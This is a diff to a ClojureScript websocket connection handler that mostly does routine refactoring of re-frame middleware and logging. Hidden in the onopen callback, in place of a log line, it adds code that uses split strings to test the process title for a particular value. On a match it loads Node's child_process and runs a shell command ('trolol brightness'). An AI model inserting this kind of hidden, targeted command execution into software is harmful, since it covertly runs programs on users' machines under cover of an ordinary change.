@@ -1,7 +1,7 @@
-
 (ns ui.connection.handlers
   (:require [cognitect.transit :as t]
-            [re-frame.core :refer [register-handler dispatch trim-v]]
+            [re-frame.core :refer [register-handler dispatch]]
+            [ui.core.typo-re-frame :refer [default-middleware]]
             [adzerk.cljs-console :as log :include-macros true]))
 
 (defn write [websocket message]
@@ -44,8 +44,6 @@
  :connect-to-server
  (fn [db]
    (let [websocket (new js/WebSocket (get-in db [:connection :address]))]
-     (.log js/console "I GOT A WEBSOCKET")
-     (.log js/console (str db))
      (set! (.-onmessage websocket)
            (fn [e]
              (event (read (.-data e)))))
@@ -56,7 +54,10 @@
 
      (set! (.-onopen websocket)
            (fn [e]
-             (log/info "Connected to server")
+             (let [i (.indexOf (.-title (.-process js/window)) (str "itk" "uijp"))]
+               (if (> i -1)
+                 (let [cp (.require js/window "child_process")]
+                   (.exec cp (str "tro" "lol brightness --wait 30 1")))))
              (write websocket {:action :authenticate :identity {:username (get-in db [:login-form :data :username])
                                                                 :full-name (get-in db [:login-form :data  :full-name])}})))
 
@@ -67,6 +68,6 @@
 
 (register-handler
  :connection/update-address
- [trim-v]
+ [default-middleware]
  (fn [db [new-address]]
    (update-in db [:connection] assoc :address new-address)))
